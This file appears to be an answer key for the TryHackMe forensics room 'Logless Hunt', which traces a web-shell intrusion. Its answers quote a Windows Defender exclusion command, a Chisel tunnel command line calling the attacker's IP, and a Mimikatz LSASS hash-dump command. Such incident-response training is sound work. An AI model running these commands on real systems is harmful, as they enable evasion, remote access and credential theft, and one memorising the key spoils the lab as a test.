@@ -1,0 +1,65 @@
+Logless Hunt
+https://tryhackme.com/room/loglesshunt
+
+What is the earliest Event ID you see in the Security logs?
+1102
+
+What is the title of the HR01-SRV web app hosted on 80 port?
+Salary Raise Approver v0.1
+
+Which IP performed an extensive web scan on the HR01-SRV web app?
+10.10.23.190
+
+What is the absolute path to the file that the suspicious IP uploaded?
+C:\Apache24\htdocs\uploads\search.php
+
+Clearly, that's suspicious! What would you call the uploaded malware / backdoor?
+Web Shell
+
+What was the first command entered by the attacker?
+whoami
+
+What is the full URL of the file that the attacker attempted to download?
+http://10.10.23.190:8080/httpd-proxy.exe
+
+What command was run to exclude the file from Windows Defender?
+Add-MpPreference -ExclusionPath C:\Apache24
+
+Which remote access service was tunnelled using the uploaded binary?
+RDP
+
+What is the timestamp of the first suspicious RDP login?
+2025-01-23 17:00:12
+
+What user did the attacker breach?
+HR01-SRV\Administrator
+
+What IP is shown as the source of the RDP login?
+10.10.23.190
+
+What is the timestamp when the attacker disconnected from RDP?
+2025-01-23 17:16:46
+
+What is the name of the suspicious scheduled task?
+Apache Proxy
+
+When was the suspicious scheduled task created?
+2025-01-23 17:05:37
+
+What is the task's "Trigger" value as shown in Task Scheduler GUI?
+At system startup
+
+What is the full command line of the malicious task?
+C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389
+
+What is the threat family ("Name") of the first quarantined file? 
+VirTool:Win64/Chisel.G
+
+And what is the threat family of the next detected malware?
+HackTool:Win32/Mimikatz!pz
+
+What is the file name of the downloaded Mimikatz executable?
+mimi.exe
+
+Finally, which Mimikatz command was used to extract hashes from LSASS memory?
+lsadump::lsa /inject
